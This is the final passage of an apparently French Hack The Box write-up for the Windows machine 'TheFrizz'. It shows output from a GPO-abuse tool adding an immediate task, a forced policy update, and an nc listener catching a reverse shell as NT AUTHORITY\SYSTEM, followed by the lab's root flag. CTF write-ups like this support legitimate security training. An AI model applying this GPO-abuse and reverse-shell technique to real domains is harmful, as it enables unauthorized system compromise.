+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">The</span> <span class="n">GPO</span> <span class="n">was</span> <span class="n">modified</span> <span class="n">to</span> <span class="n">include</span> <span class="n">a</span> <span class="n">new</span> <span class="n">immediate</span> <span class="n">task</span><span class="p">.</span> <span class="n">Wait</span> <span class="k">for</span> <span class="n">the</span> <span class="n">GPO</span> <span class="n">refresh</span> <span class="n">cycle</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="p">[+]</span> <span class="n">Done</span><span class="p">!</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">ProgramData</span><span class="p">&gt;</span> <span class="n">gpupdate</span> <span class="p">/</span><span class="n">force</span>
+</span></span><span class="line"><span class="cl"><span class="n">Updating</span> <span class="n">policy</span><span class="p">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Computer</span> <span class="n">Policy</span> <span class="n">update</span> <span class="n">has</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">User</span> <span class="n">Policy</span> <span class="n">update</span> <span class="n">has</span> <span class="n">completed</span> <span class="n">successfully</span><span class="p">.</span></span></span></code></pre></div></div>
+<p>J&rsquo;obtiens ainsi un shell en tant que <strong><code>nt authority\system</code></strong>.</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-powershell">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">root</span><span class="nv">@exegol</span><span class="n">-htb</span><span class="p">]</span> <span class="p">/</span><span class="n">workspace</span><span class="p">/</span><span class="n">TheFrizz</span>
+</span></span><span class="line"><span class="cl"><span class="err">❯</span> <span class="n">rlwrap</span> <span class="n">nc</span> <span class="n">-lvnp</span> <span class="mf">9001</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ncat</span><span class="err">:</span> <span class="n">Version</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="n">https</span><span class="err">:</span><span class="p">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="p">/</span><span class="n">ncat</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ncat</span><span class="err">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">::</span><span class="err">:</span><span class="mf">9001</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ncat</span><span class="err">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0</span><span class="p">.</span><span class="py">0</span><span class="p">.</span><span class="mf">0</span><span class="err">:</span><span class="mf">9001</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ncat</span><span class="err">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">11</span><span class="p">.</span><span class="py">60</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl"><span class="n">Ncat</span><span class="err">:</span> <span class="n">Connection</span> <span class="n">from</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">11</span><span class="p">.</span><span class="mf">60</span><span class="err">:</span><span class="mf">55038</span><span class="p">.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">whoami</span>
+</span></span><span class="line"><span class="cl"><span class="n">nt</span> <span class="n">authority</span><span class="p">\</span><span class="n">system</span>
+</span></span><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="nb">type </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span><span class="p">\</span><span class="n">Desktop</span><span class="p">\</span><span class="n">root</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">406e039636272b5abe59834d1b6618d2</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://i.gifer.com/origin/32/32e6faebe53c8c175229ae4f9611d165_w200.webp"
+        data-srcset="https://i.gifer.com/origin/32/32e6faebe53c8c175229ae4f9611d165_w200.webp, https://i.gifer.com/origin/32/32e6faebe53c8c175229ae4f9611d165_w200.webp 1.5x, https://i.gifer.com/origin/32/32e6faebe53c8c175229ae4f9611d165_w200.webp 2x"
+        data-sizes="auto"
+        alt="https://i.gifer.com/origin/32/32e6faebe53c8c175229ae4f9611d165_w200.webp"
+        title="https://i.gifer.com/origin/32/32e6faebe53c8c175229ae4f9611d165_w200.webp" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2025-12-11</span>
+            </div><div id="page-views" class="post-info-mod">
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/thefrizz/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="http://localhost:1313/thefrizz/" data-title="TheFrizz" data-via="z3rodol" data-hashtags="Medium,Windows,Active Directory,CVE-2023-45878,SharpGPOAbuse,MySQL,SSH"><i class="fab fa-x-twitter" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/medium/">Medium</a>,&nbsp;<a href="/tags/windows/">Windows</a>,&nbsp;<a href="/tags/active-directory/">Active Directory</a>,&nbsp;<a href="/tags/cve-2023-45878/">CVE-2023-45878</a>,&nbsp;<a href="/tags/sharpgpoabuse/">SharpGPOAbuse</a>,&nbsp;<a href="/tags/mysql/">MySQL</a>,&nbsp;<a href="/tags/ssh/">SSH</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/tombwatcher/" class="prev" rel="prev" title="TombWatcher"><i class="fas fa-angle-left" aria-hidden="true"></i>TombWatcher</a>
+            <a href="/shocker/" class="next" rel="next" title="Shocker">Shocker<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.158.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2025 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://z3rodol.github.io" target="_blank">z3rodol</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
+            </a>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script src="/lib/autocomplete/autocomplete.min.js"></script><script src="/lib/lunr/lunr.min.js"></script><script src="/lib/lazysizes/lazysizes.min.js"></script><script src="/lib/lightgallery/lightgallery.min.js"></script><script src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script src="/lib/clipboard/clipboard.min.js"></script><script src="/lib/sharer/sharer.min.js"></script><script src="/lib/katex/katex.min.js"></script><script src="/lib/katex/contrib/auto-render.min.js"></script><script src="/lib/katex/contrib/copy-tex.min.js"></script><script src="/lib/katex/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":15,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
+</html>
